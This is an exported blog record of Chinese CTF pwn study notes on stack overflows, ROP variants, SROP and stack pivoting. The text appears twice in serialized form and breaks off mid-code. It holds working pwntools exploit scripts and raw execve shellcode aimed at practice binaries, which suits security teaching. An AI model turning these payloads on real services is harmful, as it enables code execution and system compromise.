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)\n\n但是目前它已经被vsyscall-emulate和vdso机制代替了。此外，目前大多数系统都会开启ASLR保护，所以相对来说这些gadgets都并不容易找到。\n\n值得一说的是，对于sigreturn系统调用来说，在64位系统中，sigreturn系统调用对应的系统调用号为15，只需要RAX=15，并且执行syscall即可实现调用syscall调用。而RAX寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说read函数的返回值为读取的字节数。\n\n**利用工具**\n\n**值得一提的是，在目前的pwntools中已经集成了对于srop的攻击。**\n\n**360春秋杯中的smallest-pwn为例**\n\n1.确定文件基本信息\n\n➜ smallest file smallest   \n smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped\n\n可以看到该程序为64位静态链接版本。\n\n2.检查保护\n\n➜ smallest checksec smallest   \n   Arch:   amd64-64-little\n   RELRO:  No RELRO\n   Stack:  No canary found\n   NX:    NX enabled\n   PIE:   No PIE (0x400000)\n\n程序主要开启了NX保护。\n\n3.漏洞发现\n\n实用IDA直接反编译看了一下，发现程序就几行汇编代码，如下\n\n```assembly\npublic start\nstart proc near\nxor     rax, rax\nmov     edx, 400h\nmov     rsi, rsp\nmov     rdi, rax\nsyscall\nretn\nstart endp\n```\n\n根据syscall的编号为0，可以知道改程序执行的指令为read(0,$rsp,400)，即向栈顶读入400个字符。毫无疑问，这个是有栈溢出的。\n\n4.利用思路\n\n由于程序中并没有sigreturn调用，所以我们得自己构造，正好这里有read函数调用，所以我们可以通过read函数读取的字节数来设置rax的值。重要思路如下\n\n- 通过控制read读取的字符数来设置RAX寄存器的值，从而执行sigreturn\n- 通过syscall执行execve(\"/bin/sh\",0,0)来获取shell。\n\n5.漏洞利用程序\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\nsmall = ELF('./smallest')\nif args['REMOTE']:\n    sh = remote('127.0.0.1', 7777)\nelse:\n    sh = process('./smallest')\ncontext.arch = 'amd64'\ncontext.log_level = 'debug'\nsyscall_ret = 0x00000000004000BE\nstart_addr = 0x00000000004000B0\n## set start addr three times\npayload = p64(start_addr) * 3\nsh.send(payload)\n## modify the return addr to start_addr+3\n## so that skip the xor rax,rax; then the rax=1\n## get stack addr\nsh.send('\\xb3')\nstack_addr = u64(sh.recv()[8:16])\nlog.success('leak stack addr :' + hex(stack_addr))\n## make the rsp point to stack_addr\n## the frame is read(0,stack_addr,0x400)\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_read\nsigframe.rdi = 0\nsigframe.rsi = stack_addr\nsigframe.rdx = 0x400\nsigframe.rsp = stack_addr\nsigframe.rip = syscall_ret\npayload = p64(start_addr) + 'a' * 8 + str(sigframe)\nsh.send(payload)\n## set rax=15 and call sigreturn\nsigreturn = p64(syscall_ret) + 'b' * 7\nsh.send(sigreturn)\n## call execv(\"/bin/sh\",0,0)\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_execve\nsigframe.rdi = stack_addr + 0x120  # \"/bin/sh\" 's addr\nsigframe.rsi = 0x0\nsigframe.rdx = 0x0\nsigframe.rsp = stack_addr\nsigframe.rip = syscall_ret\nframe_payload = p64(start_addr) + 'b' * 8 + str(sigframe)\nprint len(frame_payload)\npayload = frame_payload + (0x120 - len(frame_payload)) * '\\x00' + '/bin/sh\\x00'\nsh.send(payload)\nsh.send(sigreturn)\nsh.interactive()\n```\n\n其基本流程为\n\n- 读取三个程序起始地址\n- 程序返回时，利用第一个程序起始地址读取地址，修改返回地址(即第二个程序起始地址)为源程序的第二条指令，并且会设置rax=1\n- 那么此时将会执行write(1,$esp,0x400)，泄露栈地址。\n- 利用第三个程序起始地址进而读入payload\n- 再次读取构造sigreturn调用，进而将向栈地址所在位置读入数据，构造execve('/bin/sh',0,0)\n- 再次读取构造sigreturn调用，从而获取shell。\n\n**花式栈溢出技巧**\n\n**stack privot**\n\nstack privot，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP。一般来说，我们可能在以下情况需要使用stack privot\n\n- 可以控制的栈溢出的字节数较少，难以构造较长的ROP链\n- 开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。\n- 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而利用堆漏洞\n\n此外，利用stack privot有以下几个要求\n\n- 可以控制程序执行流。\n\n- 可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是\n\n  **pop rsp/esp**\n\n当然，还会有一些其它的姿势。比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针。上面的是正常的，下面的是偏移的。\n\n```assembly\ngef➤  x/7i 0x000000000040061a\n0x40061a <__libc_csu_init+90>:  pop    rbx\n0x40061b <__libc_csu_init+91>:  pop    rbp\n0x40061c <__libc_csu_init+92>:  pop    r12\n0x40061e <__libc_csu_init+94>:  pop    r13\n0x400620 <__libc_csu_init+96>:  pop    r14\n0x400622 <__libc_csu_init+98>:  pop    r15\n0x400624 <__libc_csu_init+100>: ret    \ngef➤  x/7i 0x000000000040061d\n0x40061d <__libc_csu_init+93>:  pop    rsp\n0x40061e <__libc_csu_init+94>:  pop    r13\n0x400620 <__libc_csu_init+96>:  pop    r14\n0x400622 <__libc_csu_init+98>:  pop    r15\n0x400624 <__libc_csu_init+100>: ret\n```\n\n此外，还有更加高级的fake frame。\n\n- 存在可以控制内容的内存，一般有如下\n- bss段。由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限。\n- heap。但是这个需要我们能够泄露堆地址。\n\n以**X-CTF Quals 2016 - b0verfl0w**为例\n\n1.首先，查看程序的安全保护，如下：\n\n➜ X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ checksec b0verfl0w         \n   Arch:   i386-32-little\n   RELRO:  Partial RELRO\n   Stack:  No canary found\n   NX:    NX disabled\n   PIE:   No PIE (0x8048000)\n   RWX:   Has RWX segments\n\n2.可以看出源程序为32位，也没有开启NX保护，下面我们来找一下程序的漏洞：\n\n```c\nsigned int vul()\n{\n  char s; // [sp+18h] [bp-20h]@1\n  puts(\"\\n======================\");\n  puts(\"\\nWelcome to X-CTF 2016!\");\n  puts(\"\\n======================\");\n  puts(\"What's your name?\");\n  fflush(stdout);\n  fgets(&s, 50, stdin);\n  printf(\"Hello %s.\", &s);\n  fflush(stdout);\n  return 1;\n}\n```\n\n3.可以看出，源程序存在栈溢出漏洞。但是其所能溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode并执行。基本利用思路如下：\n\n\\- 利用栈溢出布置shellcode\n \\- 控制eip指向shellcode处\n\n4.第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。\n\n```assembly\n➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only 'jmp|ret'         \nGadgets information\n============================================================\n0x08048504 : jmp esp\n0x0804836a : ret\n0x0804847e : ret 0xeac1\nUnique gadgets found: 3\n```\n\n5.这里我们发现有一个可以直接跳转到esp的gadgets。那么我们可以布置payload如下：\n\n```\nshellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp\n```\n\n那么我们payload中的最后一部分改如何设置esp呢，可以知道：\n\n- size(shellcode+padding)=0x20\n- size(fake ebp)=0x4\n- size(0x08048504)=0x4\n\n所以我们最后一段需要执行的指令就是：\n\nsub 0x28,esp\njmp esp\n\n所以最后的exp如下：\n\n```python\nfrom pwn import *\nsh = process('./b0verfl0w')\nshellcode_x86 = \"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\"\nshellcode_x86 += \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\"\nshellcode_x86 += \"\\x0b\\xcd\\x80\"\nsub_esp_jmp = asm('sub esp, 0x28;jmp esp')\njmp_esp = 0x08048504\npayload = shellcode_x86 + (\n    0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp\nsh.sendline(payload)\nsh.interactive()\n```\n\n### 完了，应该？？ ≧ ﹏ ≦！！！\n\n","source":"_posts/ctfpwn4.md","raw":"```c\n学习笔记4\n```\n\n**栈介绍**\n\n栈是一种典型的先进后出(First in Last Out)的数据结构，其操作主要有压栈(push)与出栈(pop)两种操作，如下图所示（维基百科）。两种操作都是操作栈顶，当然，它也有相应的栈底。\n\n在计算机的汇编程序运行过程中，也充分利用了这一数据结构。每个程序都有自己的进程地址空间，进程地址空间中的某一部分就是该程序对应的栈，用于**保存函数调用信息和局部变量**。此外，常见的操作也同样是压栈与出栈。需要注意的是，与一般我们理解不同的是，**程序的栈是从进程地址空间的高地址向低地址增长的**。\n\n**函数调用栈**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629135714461.png\" alt=\"image-20210629135714461\" style=\"zoom:67%;\" />\n\n需要注意的是，32位程序与64位程序有以下简单的区别\n\n- **x86**\n\n- **函数参数**在**函数返回地址**的上方\n- **x64**\n- x64中前六个参数依次保存在**RDI,RSI, RDX, RCX, R8和 R9寄存器**里，如果还有更多的参数的话才会保存在栈上。\n- 内存地址不能大于0x00007FFFFFFFFFFF，**6个字节长度**，否则会抛出异常。\n\n**栈溢出原理**\n\n栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致栈中与其相邻的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞(比如说，还有向堆中写，向bss段写)。而对于黑客来说，栈溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：\n\n- 程序必须向栈上写入数据。\n- 写入的数据大小没有被良好地控制。\n\n最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，**当然需要确保这个地址的代码可以执行**。下面，我们举一个简单的例子：\n\n```c\n##include <stdio.h>\n##include <string.h>\nvoid success() { puts(\"You Hava already controlled it.\"); }\nvoid vulnerable() {\n  char s[12];\n  gets(s);\n  puts(s);\n  return;\n}\nint main(int argc, char **argv) {\n  vulnerable();\n  return 0;\n}\n```\n\n这个程序的主要目的读取一个字符串，并将其输出。**我们希望可以控制程序执行success函数。**\n\n1.首先，我们利用如下命令对齐进行编译\n\n```shell\n➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example\nstack_example.c: In function ‘vulnerable’:\nstack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]\n   gets(s);\n   ^\n/tmp/ccPU8rRA.o：在函数‘vulnerable’中：\nstack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.\n```\n\n可以看出gets本身是一个危险函数。而它因为其从不检查输入字符串的长度，而是以回车来判断是否输入结束，所以很容易可以导致栈溢出，\n\n历史上，**莫里斯蠕虫**第一种蠕虫病毒就利用了gets这个危险函数实现了栈溢出。\n\n此外，-m32 指的是生成32位程序； -fno-stack-protector 指的是不开启堆栈溢出保护，即不生成canary。此外，该程序并没有开启ASLR保护。这是为了更加方便地介绍栈溢出的基本利用方式。\n\n2.然后，我们在win操作机上利用IDA来反编译一下二进制程序并查看vulnerable函数（点击g输入vulnerable回车可以直接转到该函数），可以看到\n\n```c\nint vulnerable()\n{\n  char s; // [sp+4h] [bp-14h]@1\ngets(&s);\n  return puts(&s);\n}\n```\n\n3.可以看到，该字符串距离ebp的长度为0x14，那么相应的栈结构为\n\n```c\n     \t\t\t\t\t\t\t\t\t   +-----------------+\n                                           |     retaddr     |\n                                           +-----------------+\n                                           |     saved ebp   |\n                                    ebp--->+-----------------+\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                              s,ebp-0x14-->+-----------------+\n```\n\n并且，我们可以通过readelf获得success的地址，其地址为0x0804843B。\n\n```shell\nreadelf -a stack_example |grep success\n54: 0804843b    25 FUNC    GLOBAL DEFAULT   14 success\n```\n\n4.那么，如果我们读取的字符串为\n\n0x14*'a'+'bbbb'+success_addr\n\n由于gets会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将saved ebp覆盖为bbbb，将retaddr覆盖为success_addr，即，此时的栈结构为\n\n```c\n\t\t\t\t\t\t\t\t\t\t   +-----------------+\n                                           |    0x0804843B   |\n                                           +-----------------+\n                                           |       bbbb      |\n                                    ebp--->+-----------------+\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                              s,ebp-0x14-->+-----------------+\t\n```\n\n需要注意的是，由于在计算机内存中，对应的每个值都是按照字节存储的。一般情况下都是采用小端存储，即0x0804843B的存储是如下结构\n\n\\x3b\\x84\\x04\\x08\n\n6.但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候\\，x等也算一个单独的字符。。所以我们需要想办法将\\x3b之类的作为一个字符输入进去。那么此时我们就需要使用一波pwntools了(关于如何安装以及基本用法，请自行github)，这里利用pwntools的代码如下：\n\n```python\n##coding=utf8\nfrom pwn import *\n## 构造与程序交互的对象\nsh = process('./stack_example')\nsuccess_addr = 0x0804843b\n## 构造payload\npayload = 'a' * 0x14 + 'bbbb' + p32(success_addr)\nprint p32(success_addr)\n## 向程序发送字符串\nsh.sendline(payload)\n## 将代码交互转换为手工交互\nsh.interactive()\n#7.执行一波代码，可以得到\n➜  stack-example python exp.py\n[+] Starting local process './stack_example': pid 61936\n;\\x84\\x0\n[*] Switching to interactive mode\naaaaaaaaaaaaaaaaaaaabbbb;\\x84\\x0\nYou Hava already controlled it.\n[*] Got EOF while reading in interactive\n$ \n[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)\n[*] Got EOF while sending in interactive\n```\n\n可以看到我们确实已经执行success函数。\n\n**总结**\n\n**寻找危险函数**\n\n通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。\n\n常见的危险函数如下\n\n- 输入\n\n- - gets，直接读取一行，忽略'\\x00'\n  - scanf\n  - vscanf\n\n- 输出\n\n- - sprintf\n\n- 字符串\n\n- - strcpy，字符串复制，遇到'\\x00'停止\n  - strcat，字符串拼接，遇到'\\x00'停止\n  - bcopy\n\n**确定填充长度**\n\n这一部分主要是计算**我们所要操作的地址与我们所要覆盖的地址的距离**。常见的操作方法就是打开IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式\n\n- 相对于栈基地址的的索引\n- 相对应栈顶指针的索引\n- 直接地址索引\n\n其中相对于栈基地址的索引，可以直接通过查看EBP相对偏移获得；相对于栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种问题。通过绝对地址索引的，就相当于直接给定了地址。一般来说，我们会有如下的覆盖需求\n\n- **覆盖函数返回地址**，这时候就是直接看EBP即可。\n- **覆盖栈上某个变量的内容**，这时候就需要更加精细的计算了。\n- **覆盖bss段某个变量的内容**。\n- 等等\n\n之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。\n\n## ROP大章\n\n**基本ROP**-**ret2text**\n\n随着NX保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上(这一条之后不再重复提及)，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程。**所谓gadgets就是以ret结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。\n\n之所以称之为ROP，是因为核心在于利用了指令集中的ret指令，改变了指令流的执行顺序。ROP攻击一般得满足如下条件\n\n- 程序存在溢出，并且可以控制返回地址。\n- 可以找到满足条件的gadgets以及相应gadgets的地址。如果当程序开启了PIE保护，那么就必须想办法泄露gadgets的地址了。\n\nret2text即需要我们控制程序执行程序本身已有的的代码(.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是gadgets)，这就是我们所要说的rop。\n\n这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。\t\n\n**bamboofox中介绍ROP时使用的ret2text的例子：**\n\n1.首先，查看一下程序的保护机制\n\n```c\n➜  ret2text checksec ret2text\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n可以看出程序是32位程序，其仅仅开启了栈不可执行保护。\n\n2.然后，我们在win操作机中使用IDA来查看源代码。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-64h]@1\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(_bss_start, 0, 1, 0);\n  puts(\"There is something amazing here, do you know anything?\");\n  gets((char *)&v4);\n  printf(\"Maybe I will tell you next time !\");\n  return 0;\n}\n```\n\n可以看出程序在主函数中使用了gets函数，显然存在栈溢出漏洞。\n\n3.此后又发现，在secure函数又发现了存在调用system(\"/bin/sh\")的代码，那么如果我们直接控制程序返回至0x0804863A，那么就可以得到系统的shell了。\n\n```assembly\n.text:080485FD secure          proc near\n.text:080485FD\n.text:080485FD input           = dword ptr -10h\n.text:080485FD secretcode      = dword ptr -0Ch\n.text:080485FD\n.text:080485FD                 push    ebp\n.text:080485FE                 mov     ebp, esp\n.text:08048600                 sub     esp, 28h\n.text:08048603                 mov     dword ptr [esp], 0 ; timer\n.text:0804860A                 call    _time\n.text:0804860F                 mov     [esp], eax      ; seed\n.text:08048612                 call    _srand\n.text:08048617                 call    _rand\n.text:0804861C                 mov     [ebp+secretcode], eax\n.text:0804861F                 lea     eax, [ebp+input]\n.text:08048622                 mov     [esp+4], eax\n.text:08048626                 mov     dword ptr [esp], offset unk_8048760\n.text:0804862D                 call    ___isoc99_scanf\n.text:08048632                 mov     eax, [ebp+input]\n.text:08048635                 cmp     eax, [ebp+secretcode]\n.text:08048638                 jnz     short locret_8048646\n.text:0804863A                 mov     dword ptr [esp], offset command ; \"/bin/sh\"\n.text:08048641                 call    _system\n```\n\n4.下面就是我们如何构造payload了，首先需要确定的是我们能够控制的内存地址距离main函数的返回地址的字节数。\n\n```assembly\n.text:080486A7                 lea     eax, [esp+1Ch]\n.text:080486AB                 mov     [esp], eax      ; s\n.text:080486AE                 call    _gets\n```\n\n5.可以看到该字符串是通过相对于esp的索引，所以我们需要进行调试，将断点下在call处，查看esp，ebp，如下\n\n```assembly\ngef➤  b *0x080486AE\nBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.\ngef➤  r\nThere is something amazing here, do you know anything?\nBreakpoint 1, 0x080486ae in main () at ret2text.c:24\n24      gets(buf);\n───────────────────────────────────────────────────────\n────────────────[registers ]───────────────────────────\n$eax   : 0xffffcd5c  →  0x08048329  →  \"__libc_start_main\"\n$ebx   : 0x00000000\n$ecx   : 0xffffffff\n$edx   : 0xf7faf870  →  0x00000000\n$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  \"__libc_start_main\"\n$ebp   : 0xffffcdc8  →  0x00000000\n$esi   : 0xf7fae000  →  0x001b1db0\n$edi   : 0xf7fae000  →  0x001b1db0\n$eip   : 0x080486ae  →  <main+102> call 0x8048460 <gets@plt>\n```\n\n6.可以看到esp为0xffffcd40，ebp为具体的payload如下0xffffcdc8，同时s相对于esp的索引为[esp+0x1c]，所以，s的地址为0xffffcd5c，所以s相对于ebp的偏移为0x6C，所以相对于返回地址的偏移为0x6c+4。\n\n最后的payload如下：\n\n```python\n##!/usr/bin/env python\nfrom pwn import *\nsh = process('./ret2text')\ntarget = 0x804863a\nsh.sendline('A' * (0x6c+4) + p32(target))\nsh.interactive()\n```\n\n**基本ROP**-**ret2shellcode**\n\nret2shellcode需要我们控制程序执行shellcode代码。而所谓的shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell。**一般来说，shellcode都需要我们自己去填充。这其实是另外一种典型的利用的方法，即此时我们需要自己去填充一些可执行的代码**。\n\n而在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行shellcode，需要对应的binary文件没有开启NX保护。\n\n**以bamboofox中的ret2shellcode为例**\n\n```c\n➜  ret2shellcode checksec ret2shellcode\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x8048000)\n    RWX:      Has RWX segments\n```\n\n2.我们再win操作机中使用IDA看一下程序。可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到buf2处。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-64h]@1\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stdin, 0, 1, 0);\n  puts(\"No system for you this time !!!\");\n  gets((char *)&v4);\n  strncpy(buf2, (const char *)&v4, 0x64u);\n  printf(\"bye bye ~\");\n  return 0;\n}\n```\n\n3.ida中双击buf2，可知buf2在bss段。\n\n```assembly\n.bss:0804A080   public buf2\n.bss:0804A080 ; char buf2[100]\n```\n\n4.这时，我们简单的调试下程序，看看这一个bss段是否可执行。\n\n```assembly\ngef➤  b main\nBreakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.\ngef➤  r\nStarting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\nBreakpoint 1, main () at ret2shellcode.c:8\n8       setvbuf(stdout, 0LL, 2, 0LL);\n────────────[ source:ret2shellcode.c+8 ]────────────\n      6  int main(void)\n      7  {\n →    8      setvbuf(stdout, 0LL, 2, 0LL);\n      9      setvbuf(stdin, 0LL, 1, 0LL);\n     10  \n────────────────────────────────────[ trace ]────────────────────────\n[#0] 0x8048536 → Name: main()\n─────────────────────────────────────────────────────\ngef➤  vmmap\nStart      End        Offset     Perm Path\n0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so\n0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\n0xf7faf000 0xf7fb2000 0x00000000 rwx\n0xf7fd3000 0xf7fd5000 0x00000000 rwx\n0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]\n0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]\n0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffb000 0xf7ffc000 0x00000000 rwx\n0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\n0xfffdd000 0xffffe000 0x00000000 rwx [stack]\n```\n\n5.通过vmmap，我们可以看到bss段对应的段具有可执行权限\n\n```assembly\n0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n```\n\n6.那么这次我们就控制程序执行shellcode，也就是读入shellcode，然后控制程序执行bss段处的shellcode。其中，相应的偏移计算类似于ret2text中的例子。\n\n具体的payload如下\n\n```python\n##!/usr/bin/env python\nfrom pwn import *\nsh = process('./ret2shellcode')\nshellcode = asm(shellcraft.sh())\nbuf2_addr = 0x804a080\nsh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))\nsh.interactive()\n```\n\n**基本ROP**-**ret2syscall**\n\nret2syscall需要我们控制程序执行系统调用，获取shell。\n\n这里我们以bamboofox中的ret2syscall为例\n\n1.首先检测程序开启的保护。\n\n```assembly\n➜  ret2syscall checksec rop\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n2.可以看出，源程序为32位，开启了NX保护。接下来利用IDA来查看源码\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-64h]@1\nsetvbuf(stdout, 0, 2, 0);\n  setvbuf(stdin, 0, 